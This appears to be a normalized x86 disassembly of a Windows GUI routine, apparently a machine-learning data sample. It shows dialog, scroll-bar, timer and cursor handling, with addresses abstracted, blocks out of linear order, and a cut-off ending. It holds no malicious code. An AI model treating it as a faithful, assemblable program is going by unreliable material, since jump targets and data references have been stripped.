lea ecx [ eax + 0x118 ]
call sub_421150
mov edx [ rw-data ]
mov ecx [ rw-data ]
push edx
add ecx 0x134
call sub_421150
mov eax [ rw-data ]
mov ecx [ rw-data ]
push eax
add ecx 0x150
call sub_421150
fild [ rw-data ]
mov esi [ rw-data ]
fstp [ ebp - 0x30 ]
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx esi
call sub_444100
test eax eax
mov [ ebp + 0xc ] eax
fild [ ebp + 0xc ]
jge r-xdata
imul ecx ecx 0x70
mov ecx [ ecx + edx - 0x28 ]
inc ecx
push ecx
lea ecx [ eax + 0x2d8 ]
call sub_421150
mov edx [ rw-data ]
mov ecx [ rw-data ]
push edx
add ecx 0x2f4
call sub_421150
mov eax [ rw-data ]
mov ecx [ rw-data ]
push eax
add ecx 0x310
call sub_421150
mov eax [ ebp + 0x8 ]
push eax
call [ DestroyWindow@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x1
lea edx [ ebp - 0x50 ]
push edx
push 0x2
push edi
call [ SetScrollInfo@IAT ]
mov eax [ ebp - 0x3c ]
push eax
lea ecx [ ebp - 0x1a4 ]
push r--data
push ecx
mov [ rw-data ] 0x1
call [ wsprintfA@IAT ]
mov esi [ ebp + 0x8 ]
mov ebx [ GetDlgItem@IAT ]
add esp 0xc
push 0x53b
push esi
call ebx
cmp edi eax
jne r-xdata
jmp [ ecx * 4 + jump_table_499fac ]
mov ebx [ ebp + 0x8 ]
lea ecx [ ebp - 0x84 ]
push ecx
push ebx
call [ GetWindowRect@IAT ]
mov edi [ GetCursorPos@IAT ]
lea edx [ ebp - 0x18 ]
push edx
call edi
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx [ rw-data ]
add ecx 0x150
call sub_41f020
mov [ rw-data ] eax
mov ecx [ rw-data ]
add ecx 0x134
call sub_41f020
mov [ rw-data ] eax
mov edi [ rw-data ]
lea eax [ edi + 0x48 ]
mov [ ebp + 0xc ] eax
mov eax [ rw-data ]
xor ebx ebx
push 0x5
push esi
call [ ShowWindow@IAT ]
mov eax [ rw-data ]
mov ecx [ rw-data ]
push 0x45
push 0x0
push 0x0
push eax
push ecx
push 0x0
push esi
call [ SetWindowPos@IAT ]
jmp r-xdata
mov edx [ rw-data ]
push edx
push esi
call [ KillTimer@IAT ]
mov [ rw-data ] edi
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor ebx ebx
cmp [ rw-data ] edi
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
cmp eax 0x2
jne r-xdata
mov [ rw-data ] esi
mov [ rw-data ] 0x2
jmp r-xdata
cmp eax edi
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
cmp di 0x4f3
jne r-xdata
mov esi [ ebp + 0x8 ]
push 0x54c
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
setne al
test al al
mov [ rw-data ] al
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
push ebx
jne r-xdata
fdivr [ ebp - 0x30 ]
mov eax [ rw-data ]
cmp [ eax + 0x380 ] 0x3
fstp [ rw-data ]
je r-xdata
fadd [ r--data ]
push 0x53d
push esi
call ebx
cmp edi eax
jne r-xdata
lea edx [ ebp - 0x1a4 ]
push edx
push 0x0
push 0xc
push 0x53a
push esi
call [ SendDlgItemMessageA@IAT ]
mov eax [ ebp - 0x3c ]
test eax eax
mov [ rw-data ] eax
jle r-xdata
mov ecx [ ebp - 0x48 ]
mov [ ebp - 0x3c ] ecx
jmp r-xdata
mov edx [ ebp - 0x44 ]
sub edx [ ebp - 0x40 ]
inc edx
mov [ ebp - 0x3c ] edx
jmp r-xdata
mov eax [ ebp - 0x3c ]
cmp eax [ ebp - 0x48 ]
jle r-xdata
mov ecx [ ebp - 0x44 ]
mov esi [ ebp - 0x40 ]
mov eax [ ebp - 0x3c ]
sub ecx esi
inc ecx
cmp eax ecx
jge r-xdata
mov eax [ ebp - 0x3c ]
mov ecx [ ebp - 0x48 ]
sub eax 0xa
cmp eax ecx
mov [ ebp - 0x3c ] eax
jge r-xdata
mov ecx [ ebp - 0x3c ]
mov eax [ ebp - 0x44 ]
mov esi [ ebp - 0x40 ]
add ecx 0xa
sub eax esi
inc eax
cmp ecx eax
mov [ ebp - 0x3c ] ecx
jle r-xdata
shr eax 0x10
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx [ rw-data ]
sub ecx edi
mov eax 0x92492493
imul ecx
mov eax [ rw-data ]
add edx ecx
sar edx 0x6
mov ecx edx
shr ecx 0x1f
add edx ecx
xor edx edx
jmp r-xdata
push 0x1
push 0x4f3
push esi
mov [ rw-data ] 0x1
call edi
push r--data
push 0x0
push 0xc
push 0x4f3
push esi
call [ SendDlgItemMessageA@IAT ]
lea eax [ ebp - 0x68 ]
push eax
mov [ ebp - 0x68 ] 0x10
mov [ ebp - 0x64 ] 0x2
mov [ ebp - 0x60 ] esi
call [ _TrackMouseEvent@IAT ]
mov [ rw-data ] 0x0
push 0x0
push 0x4f3
push esi
call edi
push r--data
push 0x0
push 0xc
push 0x4f3
push esi
call [ SendDlgItemMessageA@IAT ]
jmp r-xdata
movzx edx [ rw-data ]
mov edi [ CheckDlgButton@IAT ]
push edx
push 0x54c
push esi
call edi
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov ecx [ rw-data ]
add ecx 0x134
call sub_41f020
cmp eax 0xffffffff
jne r-xdata
mov ebx 0x1
jmp r-xdata
call [ ReleaseCapture@IAT ]
mov eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x68 ]
push ecx
mov [ ebp - 0x68 ] 0x10
mov [ ebp - 0x64 ] 0x12
mov [ ebp - 0x60 ] eax
call [ _TrackMouseEvent@IAT ]
mov [ rw-data ] 0x0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
push 0x1
push 0x6
push edi
call [ SendMessageA@IAT ]
mov eax [ rw-data ]
cmp eax esi
jge r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov esi [ rw-data ]
jmp r-xdata
cmp di 0x4ed
jne r-xdata
mov esi [ ebp + 0x8 ]
push 0x4f3
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
mov ecx [ rw-data ]
push ecx
push esi
call [ KillTimer@IAT ]
push 0x0
push 0x0
push 0x0
push esi
call sub_481c40
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
push 0x0
push 0x0
push eax
call [ InvalidateRect@IAT ]
push sub_481c40
push 0x64
push 0x1
push esi
call [ SetTimer@IAT ]
push 0x0
push 0x0
push 0x0
push esi
mov [ rw-data ] eax
call sub_481c40
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ eax + 0x118 ]
call sub_421150
mov ecx [ rw-data ]
push ebx
add ecx 0x134
call sub_421150
mov ecx [ rw-data ]
push ebx
add ecx 0x150
call sub_421150
mov eax [ rw-data ]
cmp [ eax + 0x380 ] 0x3
jne r-xdata
lea ecx [ eax + 0x2d8 ]
call sub_421150
mov ecx [ rw-data ]
push ebx
add ecx 0x2f4
call sub_421150
mov ecx [ rw-data ]
push ebx
add ecx 0x310
call sub_421150
jmp r-xdata
push 0x0
push eax
call sub_493140
add esp 0x8
cmp [ eax + 0x34 ] 0x10
jb r-xdata
push 0x53f
push esi
call ebx
cmp edi eax
jne r-xdata
lea edx [ ebp - 0x1a4 ]
push edx
push 0x0
push 0xc
push 0x53c
push esi
call [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x0
push esi
mov [ rw-data ] 0x1
call sub_481c40
mov eax [ ebp - 0x3c ]
mov [ rw-data ] eax
jmp r-xdata
push esi
push 0x1
push 0x6
push esi
call [ SendMessageA@IAT ]
mov [ rw-data ] 0x0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ rw-data ]
dec eax
cmp eax ecx
je r-xdata
dec eax
jmp r-xdata
inc eax
jmp r-xdata
mov [ ebp - 0x3c ] ecx
jmp r-xdata
jmp r-xdata
cmp [ rw-data ] 0x2
jne r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
call edi
mov eax [ rw-data ]
lea edx [ ebp - 0x18 ]
push edx
push eax
call [ ScreenToClient@IAT ]
mov eax [ ebp - 0x18 ]
mov ecx [ rw-data ]
mov esi [ rw-data ]
sub ecx eax
mov eax ecx
cdq
xor eax edx
sub eax edx
cmp eax 0x2
jg r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
test eax eax
jle r-xdata
mov ecx [ ebp + 0xc ]
lea edx [ eax - 0x1 ]
cmp [ ecx ] edx
je r-xdata
cmp ebx edx
jge r-xdata
push sub_481c40
push 0x64
push 0x1
push esi
mov [ rw-data ] 0x0
call [ SetTimer@IAT ]
mov [ rw-data ] eax
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx [ rw-data ]
inc ebx
push ebx
lea edx [ ebp - 0x1a4 ]
push r--data
push edx
mov [ rw-data ] ebx
call [ wsprintfA@IAT ]
mov al [ rw-data ]
add esp 0xc
test al al
jne r-xdata
push 0x0
push 0x4ee
push esi
call edi
push eax
call [ EnableWindow@IAT ]
mov esi [ ebp + 0x8 ]
mov edi [ GetDlgItem@IAT ]
push ebx
push 0x1
push esi
call edi
push eax
call [ EnableWindow@IAT ]
push ebx
push 0x53a
push esi
call edi
push eax
call [ EnableWindow@IAT ]
push ebx
push 0x53b
push esi
call edi
push eax
call [ EnableWindow@IAT ]
push ebx
push 0x53c
push esi
call edi
push eax
call [ EnableWindow@IAT ]
push ebx
push 0x53d
push esi
call edi
push eax
call [ EnableWindow@IAT ]
push ebx
push 0x53e
push esi
call edi
push eax
call [ EnableWindow@IAT ]
push ebx
push 0x53f
push esi
call edi
push eax
call [ EnableWindow@IAT ]
push ebx
push 0x4ee
push esi
call edi
push eax
call [ EnableWindow@IAT ]
test ebx ebx
je r-xdata
sub eax esi
mov [ rw-data ] eax
mov ecx esi
sub ecx eax
mov [ rw-data ] ecx
mov [ rw-data ] esi
jmp r-xdata
lea edx [ ebp - 0x18 ]
push edx
call [ GetCursorPos@IAT ]
mov ecx [ rw-data ]
lea eax [ ebp - 0x18 ]
push eax
push ecx
call [ ScreenToClient@IAT ]
mov edx [ ebp - 0x18 ]
sub edx esi
mov [ ebp + 0xc ] edx
fild [ ebp + 0xc ]
push ecx
fdiv [ rw-data ]
fstp [ esp ]
call sub_452500
mov edi [ ebp + 0x8 ]
add esp 0x4
push 0x0
push 0x0
push 0x0
push edi
mov esi eax
mov [ rw-data ] 0x1
call sub_481c40
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
cmp di 0x53a
je r-xdata
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
je r-xdata
push 0x1
push 0x4f3
push esi
call [ CheckDlgButton@IAT ]
push r--data
push 0x0
push 0xc
push 0x4f3
push esi
call [ SendDlgItemMessageA@IAT ]
mov [ rw-data ] 0x1
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
push 0x4f3
push esi
call [ CheckDlgButton@IAT ]
push r--data
push 0x0
push 0xc
push 0x4f3
push esi
call [ SendDlgItemMessageA@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x8 ]
push edx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call [ DestroyWindow@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
push eax
call sub_493140
add esp 0x8
call sub_45f170
call sub_45f170
mov eax [ ebp + 0x8 ]
push eax
call [ DestroyWindow@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push 0x0
call sub_4290f0
mov edx [ rw-data ]
add esp 0x4
push 0x0
push 0x0
push edx
call [ InvalidateRect@IAT ]
lea ecx [ eax + 0x20 ]
mov ecx [ eax + 0x20 ]
jmp r-xdata
mov [ rw-data ] 0x0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea ecx [ ebp - 0x1a4 ]
push ecx
push 0x0
push 0xc
push 0x53e
push esi
call [ SendDlgItemMessageA@IAT ]
push 0x0
push 0x0
push 0x0
push esi
mov [ rw-data ] 0x1
call sub_481c40
mov edx [ ebp - 0x3c ]
mov [ rw-data ] edx
push 0x0
push 0x0
push 0x0
push esi
call sub_481c40
push 0x1
push 0x0
push eax
mov eax [ rw-data ]
push eax
call sub_485220
mov eax [ rw-data ]
add esp 0x10
test eax eax
jne r-xdata
mov [ ebp - 0x3c ] eax
mov esi [ rw-data ]
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
mov dl [ ebp + 0x10 ]
test dl 0x1
je r-xdata
mov edx [ ebp - 0x14 ]
mov eax esi
sub eax edx
cdq
xor eax edx
sub eax edx
cmp eax 0x2
jle r-xdata
mov eax [ ebp - 0x18 ]
cmp [ ebp - 0x84 ] eax
jg r-xdata
mov ecx [ rw-data ]
dec eax
cmp eax ecx
je r-xdata
lea eax [ ebx + 0x1 ]
mov [ rw-data ] eax
inc ebx
add ecx 0x70
mov [ ebp + 0xc ] ecx
jmp r-xdata
mov ecx [ rw-data ]
mov eax 0x1
push eax
lea edx [ ebp - 0x50 ]
push edx
push 0x2
push 0x53b
push esi
mov [ rw-data ] 0x1
mov [ ebp - 0x50 ] 0x1c
mov [ ebp - 0x4c ] 0x7
mov [ ebp - 0x48 ] eax
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x40 ] eax
call edi
push eax
call [ SetScrollInfo@IAT ]
mov ebx [ rw-data ]
call sub_40af00
push eax
xor eax eax
mov al [ rw-data ]
mov ecx ebx
push eax
call sub_4440b0
mov ebx [ rw-data ]
test ebx ebx
mov [ ebp + 0xc ] eax
jge r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
push 0x0
push 0xc
push 0x53a
push esi
call [ SendDlgItemMessageA@IAT ]
mov [ rw-data ] 0x1
mov eax edi
shr eax 0x10
cmp eax 0x300
jne r-xdata
cmp di 0x53c
je r-xdata
mov eax [ rw-data ]
cmp [ rw-data ] eax
jne r-xdata
mov eax [ rw-data ]
test eax eax
je r-xdata
push 0x0
push eax
push 0x1
push 0x1
push ecx
push 0x3
call sub_423c30
add esp 0x18
jmp r-xdata
mov edi [ rw-data ]
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx edi
call sub_4440b0
mov [ rw-data ] eax
mov [ rw-data ] eax
mov edx [ ebp - 0x18 ]
xor eax eax
lea ecx [ ecx ]
mov ecx [ ebp - 0x18 ]
sub ecx esi
mov [ ebp + 0xc ] ecx
fild [ ebp + 0xc ]
push ecx
fdiv [ rw-data ]
fstp [ esp ]
call sub_452500
add esp 0x4
push 0x0
push 0x0
push 0x0
push ebx
mov esi eax
mov [ rw-data ] 0x1
call sub_481c40
mov eax [ rw-data ]
cmp eax 0x1
jne r-xdata
test eax eax
jne r-xdata
mov al [ rw-data ]
test al al
je r-xdata
test dl 0x2
je r-xdata
mov [ rw-data ] 0x1
mov dl [ ebp + 0x10 ]
cmp eax [ ebp - 0x7c ]
jge r-xdata
mov edx [ rw-data ]
push 0x1
push 0x0
push eax
push edx
call sub_485220
add esp 0x10
test edi edi
jne r-xdata
mov eax [ ebp + 0xc ]
cmp ebx eax
jle r-xdata
mov eax [ rw-data ]
test eax eax
jne r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
cmp di 0x53e
jne r-xdata
mov [ rw-data ] eax
mov eax [ rw-data ]
inc eax
mov ecx rw-data
mov [ rw-data ] eax
call sub_462cf0
mov ecx rw-data
call sub_462cf0
mov esi [ rw-data ]
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx esi
call sub_4440b0
mov edi [ rw-data ]
mov esi eax
call sub_40af00
xor edx edx
mov dl [ rw-data ]
push eax
mov ecx edi
push edx
call sub_444100
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
push ebx
push esi
lea ecx [ ebp - 0x44 ]
mov [ ebp - 0x4 ] 0x2
call sub_41d110
mov al [ rw-data ]
test al al
jne r-xdata
mov edx [ rw-data ]
mov ecx [ rw-data ]
inc edx
cmp ecx edx
je r-xdata
inc eax
cmp eax 0x2
jl r-xdata
inc ecx
cmp edx ecx
jle r-xdata
cmp eax 0x2
jne r-xdata
mov eax [ rw-data ]
sub eax esi
mov [ rw-data ] eax
jns r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov esi [ rw-data ]
jmp r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov [ rw-data ] 0x1
jmp r-xdata
test dl 0x3
je r-xdata
mov al [ rw-data ]
test al al
je r-xdata
mov eax [ ebp - 0x14 ]
cmp [ ebp - 0x80 ] eax
jg r-xdata
push ebx
lea edx [ ebp - 0x1a4 ]
push r--data
push edx
mov [ rw-data ] ebx
call [ wsprintfA@IAT ]
add esp 0xc
lea eax [ ebp - 0x1a4 ]
push eax
push 0x0
push 0xc
push 0x53e
push esi
call [ SendDlgItemMessageA@IAT ]
mov ecx [ ebp + 0xc ]
push 0x1
lea edx [ ebp - 0x50 ]
push edx
push 0x2
push 0x53f
push esi
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x44 ] ecx
mov [ ebp - 0x3c ] ebx
call edi
push eax
call [ SetScrollInfo@IAT ]
mov ebx [ rw-data ]
test ebx ebx
jge r-xdata
mov ebx eax
mov ebx [ rw-data ]
call sub_40af00
xor ecx ecx
mov cl [ rw-data ]
push eax
push ecx
mov ecx ebx
call sub_444100
test eax eax
mov [ ebp - 0x2c ] eax
fild [ ebp - 0x2c ]
jge r-xdata
mov ebx [ ebp + 0xc ]
jmp r-xdata
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] 0x0
mov esi [ ebp + 0x14 ]
mov ebx [ SendMessageA@IAT ]
push 0x0
push 0x0
push 0xe
push esi
mov [ ebp - 0x4 ] 0xd
call ebx
push eax
lea ecx [ ebp - 0x74 ]
call sub_401f60
cmp [ ebp - 0x5c ] 0x10
mov eax [ ebp - 0x70 ]
jae r-xdata
mov [ ebp - 0x58 ] ebx
push sub_40b090
push sub_40a3d0
push 0x2
push 0x8
lea eax [ ebp - 0x68 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_4b6874
push 0x40
mov [ ebp - 0x4 ] 0x5
call sub_4b573e
mov esi eax
add esp 0x4
mov [ ebp + 0xc ] esi
cmp esi ebx
mov [ ebp - 0x4 ] 0x6
je r-xdata
push rw-data
push rw-data
call sub_419a80
add esp 0x8
test eax eax
je r-xdata
mov ecx [ rw-data ]
xor edi edi
cmp ecx edi
je r-xdata
mov ecx [ ebp + eax * 4 - 0x30 ]
lea esi [ ecx - 0x1 ]
cmp esi edx
jg r-xdata
cmp eax 0x2
jne r-xdata
test eax eax
lea edx [ eax + 0x1 ]
mov [ rw-data ] edx
jne r-xdata
push ebx
push 0x1
push 0x6
push ebx
call [ SendMessageA@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ rw-data ] esi
neg eax
mov [ rw-data ] eax
jmp r-xdata
mov ecx [ rw-data ]
mov eax [ rw-data ]
sub eax ecx
mov [ ebp + 0xc ] eax
fild [ ebp + 0xc ]
push ecx
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
fild [ rw-data ]
add eax esi
mov [ ebp - 0x30 ] eax
fmul [ rw-data ]
fstp [ esp ]
call sub_452500
add esp 0x4
lea ecx [ ebp - 0x18 ]
add eax esi
push ecx
mov [ ebp - 0x2c ] eax
call edi
mov eax [ rw-data ]
lea edx [ ebp - 0x18 ]
push edx
push eax
call [ ScreenToClient@IAT ]
mov al [ rw-data ]
test al al
je r-xdata
test dl 0x1
mov eax [ rw-data ]
jne r-xdata
cmp eax [ ebp - 0x78 ]
jge r-xdata
mov eax [ ebp + 0xc ]
cmp ebx eax
jle r-xdata
mov ebx [ ebp + 0xc ]
jmp r-xdata
fmul [ rw-data ]
sub esp 0x8
fstp [ esp ]
call sub_452510
add esp 0x8
mov ebx eax
fadd [ r--data ]
mov ecx [ ebp - 0x60 ]
push eax
inc ecx
push ecx
push 0xd
push esi
call ebx
cmp [ ebp - 0x5c ] 0x10
mov eax [ ebp - 0x70 ]
jae r-xdata
lea eax [ ebp - 0x70 ]
xor eax eax
push ecx
mov ecx esp
mov [ ebp - 0x2c ] esp
push rw-data
call sub_40a740
mov ecx esi
call sub_40b390
jmp r-xdata
lea ecx [ ebp - 0x44 ]
call sub_462cf0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
mov esi 0x1
cmp eax esi
jne r-xdata
mov eax [ rw-data ]
sub eax ecx
sar eax 0x2
cmp eax edi
jne r-xdata
push 0x7f00
push 0x0
mov [ rw-data ] 0x0
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp eax 0x1
jne r-xdata
push 0x7f84
push eax
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test dl 0x2
je r-xdata
mov eax [ ebp + 0xc ]
mov al [ rw-data ]
test al al
je r-xdata
push ebx
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
mov [ rw-data ] ebx
call [ wsprintfA@IAT ]
add esp 0xc
lea ecx [ ebp - 0x1a4 ]
push ecx
push 0x0
push 0xc
push 0x53c
push esi
call [ SendDlgItemMessageA@IAT ]
mov edx [ ebp + 0xc ]
push 0x1
lea eax [ ebp - 0x50 ]
push eax
push 0x2
push 0x53d
push esi
mov [ ebp - 0x48 ] 0x0
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x3c ] ebx
call edi
push eax
call [ SetScrollInfo@IAT ]
push 0x0
push 0x0
push 0x0
push esi
mov [ rw-data ] 0x0
call sub_481c40
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ebx eax
push eax
call j_sub_4b692d
add esp 0x4
cmp di 0x53a
mov esi eax
mov [ ebp - 0x50 ] 0x1c
mov [ ebp - 0x4c ] 0x4
mov [ ebp - 0x3c ] esi
mov [ rw-data ] 0x1
jne r-xdata
lea eax [ ebp - 0x70 ]
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x5
call sub_40b090
push sub_40b090
push 0x2
push 0x8
lea eax [ ebp - 0x68 ]
push eax
mov [ ebp - 0x4 ] 0x4
call sub_4b6814
mov edi [ ebp - 0x58 ]
mov ecx edi
mov [ ebp - 0x4 ] 0x3
call sub_4167e0
mov ebx [ edi + 0xc ]
mov ecx eax
mov eax [ edi + 0x10 ]
cdq
sub eax edx
mov edx [ edi + 0x14 ]
mov esi eax
sar esi 0x1
xor eax eax
test esi esi
mov [ ebp - 0x34 ] ebx
mov [ ebp - 0x54 ] esi
mov [ ebp + 0xc ] edx
jle r-xdata
mov edx [ esi ]
push 0x1
mov ecx esi
call [ edx + 0x18 ]
push eax
lea ecx [ ebp - 0x9c ]
call sub_415f40
push eax
lea ecx [ ebp - 0x68 ]
mov [ ebp - 0x4 ] 0x7
call sub_40b0b0
lea ecx [ ebp - 0x9c ]
mov [ ebp - 0x4 ] 0x5
call sub_40b090
mov [ ebp - 0x30 ] 0x62
mov [ ebp - 0x2c ] 0x0
lea ecx [ ebp - 0x30 ]
push ecx
lea ecx [ ebp - 0x60 ]
mov [ ebp - 0x4 ] 0x8
call sub_40b0b0
lea ecx [ ebp - 0x30 ]
mov [ ebp - 0x4 ] 0x5
call sub_40b090
lea edx [ ebp - 0x68 ]
mov [ ebp - 0x30 ] 0x61
mov [ ebp - 0x2c ] edx
mov [ ebp - 0x2e ] 0x2
lea eax [ ebp + 0xc ]
push eax
push ebx
sub esp 0x8
lea edx [ ebp - 0x30 ]
mov ecx esp
mov [ ebp + 0xc ] esp
push edx
mov [ ebp - 0x4 ] 0x9
call sub_40b060
push r--data
lea eax [ ebp - 0xa4 ]
push eax
push rw-data
call sub_415890
mov ecx eax
call sub_40a400
lea ecx [ ebp - 0xa4 ]
mov [ ebp - 0x4 ] 0xa
call sub_40b090
mov edx [ rw-data ]
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
push rw-data
push edx
lea eax [ ebp - 0x94 ]
push eax
push esi
call [ ecx + 0x4 ]
push eax
lea ecx [ ebp - 0x58 ]
call sub_40a380
lea ecx [ ebp - 0x94 ]
call sub_40a3b0
mov eax [ esi + 0x4 ]
dec eax
mov [ ebp - 0x4 ] 0x9
mov [ esi + 0x4 ] eax
jne r-xdata
mov ecx [ ebp + 0x8 ]
push edi
push 0x4ed
push 0x111
push ecx
mov [ rw-data ] 0x2
mov [ rw-data ] edi
call [ SendMessageA@IAT ]
mov [ rw-data ] esi
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ rw-data ] eax
jl r-xdata
push 0x7f86
push 0x0
call [ LoadCursorA@IAT ]
push eax
call [ SetCursor@IAT ]
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x14 ]
imul ecx eax
sub esi edx
imul esi eax
push 0x0
push esi
push ecx
call sub_47ae00
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
add esp 0xc
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov eax [ rw-data ]
call [ ReleaseCapture@IAT ]
lea eax [ ebp - 0x68 ]
push eax
mov [ ebp - 0x68 ] 0x10
mov [ ebp - 0x64 ] 0x2
mov [ ebp - 0x60 ] ebx
call [ _TrackMouseEvent@IAT ]
mov [ rw-data ] 0x0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp di 0x53c
jne r-xdata
mov edi [ ebp + 0x8 ]
push 0x1
lea edx [ ebp - 0x50 ]
push edx
push 0x2
push 0x53b
push edi
call [ GetDlgItem@IAT ]
push eax
call [ SetScrollInfo@IAT ]
test esi esi
mov [ rw-data ] esi
jle r-xdata
mov eax 0xa
cdq
idiv [ rw-data ]
add ecx ebx
mov ebx [ ebp + 0xc ]
dec ebx
cmp ebx 0x1
mov [ ebp - 0x24 ] 0x1
mov [ ebp - 0x20 ] eax
jle r-xdata
mov edi edi
mov esi [ ebp + 0x8 ]
push edi
push edi
push edi
push esi
mov [ rw-data ] 0x1
call sub_481c40
mov eax [ rw-data ]
mov edx [ rw-data ]
mov ecx [ edx + eax * 4 ]
mov edx [ rw-data ]
mov eax [ edx + eax * 4 ]
push esi
push 0x1
push 0x6
push esi
mov [ rw-data ] ecx
mov [ rw-data ] eax
call [ SendMessageA@IAT ]
inc [ rw-data ]
mov ecx [ rw-data ]
cmp ecx edi
jne r-xdata
mov [ rw-data ] edi
cmp di 0x53e
jne r-xdata
mov edi [ ebp + 0x8 ]
push 0x1
lea ecx [ ebp - 0x50 ]
push ecx
push 0x2
push 0x53d
push edi
call [ GetDlgItem@IAT ]
push eax
call [ SetScrollInfo@IAT ]
push 0x0
push 0x0
push 0x0
push edi
mov [ rw-data ] 0x1
call sub_481c40
mov [ rw-data ] esi
jmp r-xdata
push edi
push 0x1
push 0x6
push edi
call ebx
lea ecx [ ebp - 0x74 ]
mov [ rw-data ] 0x0
call sub_4480e0
xor eax eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
dec esi
cmp esi eax
je r-xdata
mov ecx edi
call sub_4167e0
mov edx [ rw-data ]
mov [ ebp - 0x2c ] eax
mov eax 0x5
sub eax edx
shl eax 0x4
dec esi
cmp esi 0x1
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x20 ] 0x1
jle r-xdata
mov edi [ ebp - 0x54 ]
mov esi 0x1
dec edi
cmp edi esi
mov [ ecx ] 0x0
